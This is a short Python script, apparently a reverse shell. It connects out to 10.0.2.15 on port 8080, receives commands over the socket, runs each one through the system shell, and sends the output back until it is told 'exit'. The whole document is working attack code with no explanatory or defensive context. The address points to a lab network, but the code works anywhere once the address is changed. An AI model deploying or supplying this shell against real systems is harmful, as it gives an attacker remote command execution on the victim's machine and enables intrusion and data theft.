import socket
import subprocess

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('10.0.2.15', 8080))

while True:
    command=s.recv(4096).decode('UTF-8')
    
    if command=='exit':
        s.close()
        break
        
    CMD=subprocess.run(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    s.send(CMD.stdout)